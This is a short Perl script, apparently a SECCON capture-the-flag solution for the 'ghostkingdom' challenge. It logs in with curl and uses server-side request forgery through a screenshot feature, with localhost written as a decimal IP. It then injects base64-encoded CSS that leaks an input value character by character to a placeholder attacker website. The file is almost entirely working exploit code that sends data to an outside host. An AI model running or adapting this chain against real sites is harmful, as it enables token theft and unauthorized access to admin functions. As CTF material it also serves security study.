#!/usr/bin/perl
# by KeigoYAMAZAKI, 2018.10.10-

use MIME::Base64;
my $YOURWEBSITE = 'http://YOUR-WEBSITE.EXAMPLE.JP/cssinj=';

print `curl --digest -c coo 'http://ghostkingdom.pwn.seccon.jp/?user=ymzkei5&pass=manager&action=login'`;

print `curl --digest -b coo --verbose 'http://ghostkingdom.pwn.seccon.jp/?url=http%3A%2F%2F2130706433%2F%3Fuser%3Dymzkei5%26pass%3Dmanager%26action%3Dlogin&action=sshot2'`;

while(<>) {
  chomp;
  my $c = $_;
  my $css = '';
  foreach(split(//, 'abcdef0123456789')) {
    $css .= qq#input[value^="$c$_"]{background:url($YOURWEBSITE$c$_)}#;
  }
  $css = encode_base64($css);
  $css =~ s/[\r\n]+//g;
  print `curl --digest -b coo --verbose 'http://ghostkingdom.pwn.seccon.jp/?url=http%3A%2F%2F2130706433%2F%3Fcss%3d$css%26msg%3da%26action%3Dmsgadm2&action=sshot2'`;
}
